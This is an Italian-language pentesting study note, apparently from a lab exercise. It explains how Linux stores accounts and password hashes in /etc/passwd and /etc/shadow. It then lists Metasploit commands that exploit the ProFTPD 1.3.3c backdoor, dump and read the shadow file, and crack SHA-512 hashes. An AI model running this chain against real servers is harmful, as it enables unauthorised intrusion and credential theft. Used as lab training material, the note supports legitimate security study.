Linux ha il supporto multiutente e, di conseguenza, più utenti possono accedere al sistema
contemporaneamente. Questo può essere visto sia come un vantaggio che come uno svantaggio di un titolo.
In questa prospettiva, più account offrono più vettori di accesso per gli aggressori e quindi
aumentare il rischio complessivo del server.
● Tutte le informazioni per tutti gli account su Linux sono archiviate nel file passwd situato in:
/etc/passwd
● Non possiamo visualizzare le password degli utenti nel file passwd perché sono crittografate e
il file passwd è leggibile da qualsiasi utente del sistema.
● Tutte le password crittografate per gli utenti sono archiviate nel file shadow. lo si può trovare nel
seguente directory: /etc/shadow
● È possibile accedere e leggere il file shadow solo dall'account root, questo è molto importante
funzionalità di sicurezza in quanto impedisce ad altri account sul sistema di accedere all'hash
passwords.
Linux Password Hash:
● Il file passwd ci fornisce informazioni riguardo all'algoritmo di hashing utilizzato e
l'hash della password, questo è molto utile in quanto siamo in grado di determinare il tipo di algoritmo di hashing che viene utilizzato e la sua forza. Possiamo determinarlo guardando il numero dopo il nome utente incapsulato dal simbolo del dollaro ($).
- $1 (MD5)
- $2 (BlowFish)
- $5 (SHA-256)
- $6 (SHA-512)

```
> nmap -sV 192.75.64.3

### Starto postgresql database to store all Metasploit loot:
> /etc/init.d/postgresql start        
or
> service postgresql start && msfconsole -q



Trovo una vuln ftp che permette di creare una backdoor
> msfconsole -q
> use exploit/unix/ftp/proftpd_133c_backdoor
> set RHOSTS 192.229.31.3
> exploit -z


> background
> use post/linux/gather/hashdump
> set SESSION 1
> exploit


> use auxiliary/analyze/crack_linux 
> set SHA512 true 
> run


Upgrade the sessions to a meterpreter session:
/bin/bash -i

> sessions -u 1
> sessions 2
> cat /etc/shadow

Gather Linux Password hashes with Metasploit:
> search hashdump
> use post/linux/gather/hashdump 
> set SESSION 2
> run

> search crack 
> use auxiliary/analyze/crack_linux
> set SHA512 true
> run

```